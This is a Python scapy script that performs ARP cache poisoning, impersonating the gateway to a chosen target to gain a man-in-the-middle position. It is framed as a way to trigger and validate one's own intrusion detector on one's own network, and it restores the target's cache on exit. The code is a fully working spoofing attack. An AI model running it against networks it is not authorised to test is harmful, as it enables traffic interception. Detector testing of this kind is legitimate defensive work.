"""
ARP spoofing test — for validating YOUR OWN IDS on YOUR OWN network only.

Tells a target machine that the gateway is at THIS machine's MAC, so the target
sends its gateway-bound traffic to us instead (a man-in-the-middle position).
An IDS sniffing the network sees the gateway IP suddenly answering from a new
MAC and should fire an arp_spoofing alert.

Intended use ONLY: your own hardware, your own local network (e.g. two laptops
on your phone's hotspot), testing your own detector. Do not point this at
machines or networks you do not own.

Run in a second terminal. Ctrl-C restores the target's ARP cache so its
connectivity heals.

    sudo ./venv/bin/python arp_attack_test.py --target 192.168.43.50
"""
import argparse
import time
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf


def mac_of(ip, iface):
    """Resolve an IP's current MAC by asking the network."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, iface=iface, verbose=0,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None


def main():
    parser = argparse.ArgumentParser(
        description="ARP spoofing test against a chosen host on your own network")
    parser.add_argument("--target", required=True,
                        help="IP of the machine to feed the spoofed mapping to "
                             "(the other laptop running the IDS)")
    parser.add_argument("--gateway", default=None,
                        help="gateway IP to impersonate (default: default gateway)")
    parser.add_argument("--iface", default=None,
                        help="interface to use (default: system's default route)")
    parser.add_argument("--count", type=int, default=20,
                        help="number of spoofed replies to send (default 20)")
    args = parser.parse_args()

    # Auto-detect interface and gateway from the default route when unspecified.
    default_iface, _, default_gw = conf.route.route("0.0.0.0")
    gateway = args.gateway or default_gw
    iface = args.iface or default_iface

    attacker_mac = get_if_hwaddr(iface)  # this machine's own MAC

    print(f"Interface: {iface}")
    print(f"Target: {args.target}")
    print(f"Impersonating gateway {gateway} -> claiming it is at {attacker_mac}")

    # We need the target's MAC to address the spoofed reply straight to it, and
    # the gateway's real MAC to repair the target's cache when we stop.
    target_mac = mac_of(args.target, iface)
    if target_mac is None:
        print(f"Could not reach target {args.target}. Is it on this network, and "
              f"does the hotspot allow client-to-client traffic (no isolation)?")
        return

    real_gw_mac = mac_of(gateway, iface)
    if real_gw_mac is None:
        print(f"Could not resolve the real gateway MAC for {gateway}.")
        return

    # Tell the target: "the gateway is at my MAC." Directed straight at the
    # target (hwdst=target_mac), not broadcast.
    # Send at layer 2 (sendp + explicit Ether frame) so the reply is delivered
    # straight to the target's MAC. Plain send() works at layer 3, leaves the
    # Ethernet destination unset, and may broadcast or drop the packet.
    poison = (Ether(dst=target_mac, src=attacker_mac) /
              ARP(op=2, pdst=args.target, hwdst=target_mac,
                  psrc=gateway, hwsrc=attacker_mac))
    try:
        for i in range(args.count):
            sendp(poison, iface=iface, verbose=0)
            print(f"  sent spoofed reply {i + 1}/{args.count}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nInterrupted.")
    finally:
        # Restore: re-announce the gateway's real MAC to the target so its cache
        # heals and its internet connectivity comes back.
        print("Restoring correct ARP mapping on target...")
        fix = (Ether(dst=target_mac, src=real_gw_mac) /
               ARP(op=2, pdst=args.target, hwdst=target_mac,
                   psrc=gateway, hwsrc=real_gw_mac))
        sendp(fix, count=5, iface=iface, verbose=0)
        print("Done.")


if __name__ == "__main__":
    main()
